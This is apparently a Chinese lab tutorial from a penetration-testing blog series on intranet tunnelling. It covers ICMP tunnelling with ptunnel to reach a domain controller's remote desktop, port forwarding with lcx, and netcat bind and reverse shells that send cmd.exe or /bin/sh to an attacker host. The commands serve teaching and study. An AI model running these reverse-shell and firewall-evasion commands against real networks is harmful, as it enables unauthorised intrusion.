{"title":"内网安全-域横向渗透【六】","uid":"0a0a60d095a528f1d7afccb8f8c8a1f3","slug":"内网安全-域横向渗透【六】","date":"2022-07-18T02:03:24.000Z","updated":"2022-07-18T12:57:38.179Z","comments":true,"path":"api/articles/内网安全-域横向渗透【六】.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>脑图：<br><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91.htm/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F-%E7%A9%BF%E9%80%8F-16581103252421.png\" alt=\"横向渗透-穿透\"></p>\n<h2 id=\"0x01-知识点\"><a href=\"#0x01-知识点\" class=\"headerlink\" title=\"0x01 知识点\"></a>0x01 知识点</h2><h3 id=\"0x00-代理和隧道技术区别\"><a href=\"#0x00-代理和隧道技术区别\" class=\"headerlink\" title=\"0x00 代理和隧道技术区别\"></a>0x00 代理和隧道技术区别</h3><p>隧道和代理的区别是：代理是委托一个人找目标，隧道是通过特定的通讯方法，直接找到这个目标；代理最主要的特征是，无论代理后面挂了几个设备，代理对外只表现为一个设备。外部设备以为自己是在和代理交互，而不能感知代理内部的设备。隧道是一个虚拟的路径，用来使到达隧道入口的数据，穿越原本不方便穿越的网络，到达另一侧出口。</p>\n<p>1、代理</p>\n<p>代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端的“中间人”。通过代理不会改变原本的URI，每次通过代理服务器转发请求或响应时，会追加写入 Via 首部信息</p>\n<p>使用理由:利用缓存技术减少网络带宽的流量，组织内部针对特定网站的访问控制，以获取访问日志为主要目的，等等。</p>\n<p>2、隧道</p>\n<p>隧道是远距离的服务器和客户端之间的中转站。隧道可按要求建立起一条与其他服务器的通信线路，届时使用 SSL 等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全的通信。隧道本身不会去解析 HTTP 请求。也就是说，请求保持原样中转给之后的服务器。隧道会在通信双方断开连接时结束。</p>\n<p><strong>3、总结</strong></p>\n<p><strong>代理主要解决网络访问通讯问题（从一个内网到另一个内网）。</strong></p>\n<p><strong>隧道技术解决在代理基础之上通讯受阻的问题（被防火墙等检测拦截），达到绕过过滤限制等。</strong></p>\n<h3 id=\"0x01-隧道技术作用\"><a href=\"#0x01-隧道技术作用\" class=\"headerlink\" title=\"0x01 隧道技术作用\"></a>0x01 隧道技术作用</h3><p>用单独的通道来传输被拦截的数据。</p>\n<p>CS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等。 </p>\n<h3 id=\"0x02-常见隧道技术\"><a href=\"#0x02-常见隧道技术\" class=\"headerlink\" title=\"0x02 常见隧道技术\"></a>0x02 常见隧道技术</h3><p>网络层：IPv6隧道、ICMP隧道</p>\n<p>传输层：TCP隧道、UDP隧道、常规端口转发</p>\n<p>应用层：SSH隧道、HTTP&#x2F;S隧道、DNS隧道 </p>\n<p>（使用隧道之前检测是否可以使用协议）</p>\n<h2 id=\"0x02-网络传输应用层连通性检测\"><a href=\"#0x02-网络传输应用层连通性检测\" class=\"headerlink\" title=\"0x02 网络传输应用层连通性检测\"></a>0x02 网络传输应用层连通性检测</h2><h3 id=\"0x00-TCP协议\"><a href=\"#0x00-TCP协议\" class=\"headerlink\" title=\"0x00 TCP协议\"></a>0x00 TCP协议</h3><p>用“瑞士军刀”——netcat</p>\n<p>执行 nc 命令：<code>nc &lt;IP&gt; &lt;端口&gt;</code></p>\n<p>###0x01 HTTP 协议</p>\n<p>用“curl”工具，执行 curl &lt;IP 地址:端口&gt;命令。如果远程主机开启了相应的端口，且内网可连接外网的</p>\n<p>话，就会输出相应的端口信息</p>\n<p>###0x02 ICMP 协议</p>\n<p>用“ping”命令，执行 ping &lt;IP 地址&#x2F;域名&gt;</p>\n<p>###0x03 DNS 协议</p>\n<p>检测 DNS 连通性常用的命令是“nslookup”和“dig”</p>\n<p>nslookup 是 windows 自带的 DNS 探测命令</p>\n<p>dig 是 linux 系统自带的 DNS 探测命令</p>\n<h2 id=\"0x03-网络层ICMP隧道ptunnel使用-检测-利用\"><a href=\"#0x03-网络层ICMP隧道ptunnel使用-检测-利用\" class=\"headerlink\" title=\"0x03 网络层ICMP隧道ptunnel使用-检测,利用\"></a>0x03 网络层ICMP隧道ptunnel使用-检测,利用</h2><h3 id=\"0x00-pingtunnel介绍\"><a href=\"#0x00-pingtunnel介绍\" class=\"headerlink\" title=\"0x00 pingtunnel介绍\"></a>0x00 pingtunnel介绍</h3><p>下载地址：</p>\n<p>老版本介绍：<a href=\"https://github.com/f1vefour/ptunnel(%E9%9C%80%E8%87%AA%E8%A1%8C%E7%BC%96%E8%AF%91)\">https://github.com/f1vefour/ptunnel(需自行编译)</a><br>新版本介绍：<a href=\"https://github.com/esrrhs/pingtunnel(%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E7%89%88)\">https://github.com/esrrhs/pingtunnel(二次开发版)</a></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>pingtunnel 是把 tcp&#x2F;udp&#x2F;sock5 流量伪装成 icmp 流量进行转发的工具</p>\n<p>-p ##表示连接 icmp 隧道另一端的机器 IP（即目标服务器）</p>\n<p>-lp ##表示需要监听的本地 tcp 端口</p>\n<p>-da ##指定需要转发的机器的 IP（即目标内网某一机器的内网 IP）</p>\n<p>-dp ##指定需要转发的机器的端口（即目标内网某一机器的内网端口）</p>\n<p>-x ##设置连接的密码</p></blockquote>\n<h3 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p>在webserver主机执行以下命令：（实战中需要将ptunnel上传至webserver主机）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">.&#x2F;ptunnel -x xiaodi<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>xiaodi是隧道密码，防止其他任意连接可以连接到此隧道，设置密码为了只能我们自己连接</p></blockquote>\n<p>此时就是构建隧道密码就是xiaodi，执行完命令之后就处于监听状态，等待别人连接；</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91.htm/image-20220718191121515.png\" alt=\"image-20220718191121515\"></p>\n<h3 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">kali处执行命令：\n.&#x2F;ptunnel -p 192.168.76.150 -lp 1080 -da 192.168.33.33 -dp 3389 -x xiaodi<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>通过密码对webserver主机建立连接，并通过webserver主机去访问DC主机的3389远程桌面端口，将数据转发给本地kali的1080端口。</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91.htm/image-20220718191235630.png\" alt=\"image-20220718191235630\"></p>\n<p>kali连接本地的1080端口：</p>\n<p>使用rdesktop命令连接自己本地的1080端口：</p>\n<p>（因为1080端口接收了DC主机3389端口返回的数据，所以可直接连接上DC的远程桌面）</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91.htm/image-20220718191548115.png\" alt=\"image-20220718191548115\"></p>\n<p>弹出登录框：</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91.htm/image-20220718191745441.png\" alt=\"image-20220718191745441\"></p>\n<p>此时数据流量使用的不是3389对应的远程桌面服务，而是ICMP协议。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>原理：</p>\n<p>防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，</p>\n<p>与对方进行通信。</p></blockquote>\n<h2 id=\"0x04-传输层转发隧道Portmap使用\"><a href=\"#0x04-传输层转发隧道Portmap使用\" class=\"headerlink\" title=\"0x04 传输层转发隧道Portmap使用\"></a>0x04 传输层转发隧道Portmap使用</h2><h3 id=\"0x00-1\"><a href=\"#0x00-1\" class=\"headerlink\" title=\"0x00\"></a>0x00</h3><p>端口转发工具：</p>\n<p>windows: lcx</p>\n<p>linux：portmap</p>\n<h3 id=\"0x01-1\"><a href=\"#0x01-1\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p>在DC上执行以下命令，将本地3389给webserver的6666</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Lcx.exe -slave 192.168.3.31 6666 127.0.0.1 3389 &#x2F;&#x2F;将本地3389给webserver的6666<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91.htm/image-20220718193753109.png\" alt=\"image-20220718193753109\"></p>\n<p>在webserver上执行以下命令，监听6666端口流量并转发至7777</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Lcx.exe -listen 6666 7777   &#x2F;&#x2F; 监听6666转发至7777<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91.htm/image-20220718193830663.png\" alt=\"image-20220718193830663\"></p>\n<p>在kali上执行以下命令，连接webserver的7777，登录远程桌面访问，这里其实登录的是域控DC的远程桌面。</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">rdesktop <span class=\"token number\">192.168</span>.80.146:7777<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>DC 把本地的3389 转播到 webserver的6666端口 ，而webserver又把6666转到自己的7777 端口。</p>\n<p><strong>那么当kali去rdesktop访问webserver的7777端口时，就是连接的DC的远程桌面。</strong></p></blockquote>\n<h2 id=\"0x05-传输层转发隧道-Netcat-使用-检测-利用-功能\"><a href=\"#0x05-传输层转发隧道-Netcat-使用-检测-利用-功能\" class=\"headerlink\" title=\"0x05 传输层转发隧道 Netcat 使用-检测,利用,功能\"></a>0x05 传输层转发隧道 Netcat 使用-检测,利用,功能</h2><h3 id=\"0x00-双向连接反弹shell\"><a href=\"#0x00-双向连接反弹shell\" class=\"headerlink\" title=\"0x00 双向连接反弹shell\"></a>0x00 双向连接反弹shell</h3><p><strong>正向反弹 shell 攻击机连接受害机</strong> </p>\n<p>受害机DC执行以下命令：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nc -ldp 1234 -e &#x2F;bin&#x2F;sh #linux\nnc -ldp 1234 -e c:\\windows\\system32\\cmd.exe #windows\n#将自身的shell反弹至对应端口，这里是1234<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91.htm/image-20220718202212115.png\" alt=\"image-20220718202212115\"></p>\n<p>攻击主机webserver执行以下命令：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nc 192.168.3.21 1234 #使用nc主动连接受害主机<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91.htm/image-20220718202505359.png\" alt=\"image-20220718202505359\"></p>\n<p>查看IP可以看到连接到受害主机。</p>\n<p><strong>反向反弹shell 受害机连接攻击机</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nc 192.168.3.31 1234 -e c:\\windows\\system32\\cmd.exe #windows\nnc 192.168.3.31 1234 -e &#x2F;bin&#x2F;sh #linux\n受害主机主动将数据发送给攻击主机<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>攻击机监听1234端口：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nc -lvp 1234<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91.htm/image-20220718203329319.png\" alt=\"image-20220718203329319\"></p>\n<p>受害主机主动发送数据给攻击主机：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nc 192.168.3.31 1234 -e c:\\windows\\system32\\cmd.exe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91.htm/image-20220718203419189.png\" alt=\"image-20220718203419189\"></p>\n<p>可以看到反弹回受害主机的shell：</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91.htm/image-20220718203454601.png\" alt=\"image-20220718203454601\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注意：<br>受害主机能找到攻击主机就使用反向，受害主机找不到攻击主机就使用正向。</p></blockquote>\n<p>###0x01 多向连接反弹 shell</p>\n<p>使用lcx.exe监听本地2222端口给到3333端口：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">lcx.exe -listen 2222 3333<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91.htm/image-20220718204138419.png\" alt=\"image-20220718204138419\"></p>\n<p>使用nc反向连接到攻击主机webserver</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nc 192.168.3.31 2222 -e c:\\windows\\system32\\cmd.exe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91.htm/image-20220718204618158.png\" alt=\"image-20220718204618158\"></p>\n<p>在攻击主机出查看接收到来自192.168.3.32:2222的数据：</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91.htm/image-20220718204609415.png\" alt=\"image-20220718204609415\"></p>\n<p>之后再使用kali主机执行：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nc 192.168.x.x 3333 #连接外网的网卡ip<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E5%85%AD%E3%80%91.htm/image-20220718204826901.png\" alt=\"image-20220718204826901\"></p>\n<h3 id=\"0x02-相关-netcat-主要功能\"><a href=\"#0x02-相关-netcat-主要功能\" class=\"headerlink\" title=\"0x02 相关 netcat 主要功能\"></a>0x02 相关 netcat 主要功能</h3><p>指纹服务：nc -nv 192.168.76.143<br>端口扫描：nc -v -z 192.168.76.143 1-100<br>端口监听：nc -lvp xxxx<br>文件传输：nc -lp 1111 &gt;1.txt|nc -vn xx.xx.x.x 1111 &lt;1.txt -q 1<br>反弹 Shell：见上</p>\n","text":"0x00脑图： 0x01 知识点0x00 代理和隧道技术区别隧道和代理的区别是：代理是委托一个人找目标，隧道是通过特定的通讯方法，直接找到这个目标；代理最主要的特征是，无论代理后面挂了几个设备，代理对外只表现为一个设备。外部设备以为自己是在和代理交互，而不能感知代理内部的设备。隧...","link":"","photos":[],"count_time":{"symbolsCount":"3.4k","symbolsTime":"3 mins."},"categories":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/categories/内网渗透.json"}],"tags":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/tags/内网渗透.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-%E7%9F%A5%E8%AF%86%E7%82%B9\"><span class=\"toc-text\">0x01 知识点</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-%E4%BB%A3%E7%90%86%E5%92%8C%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%8C%BA%E5%88%AB\"><span class=\"toc-text\">0x00 代理和隧道技术区别</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E4%BD%9C%E7%94%A8\"><span class=\"toc-text\">0x01 隧道技术作用</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" 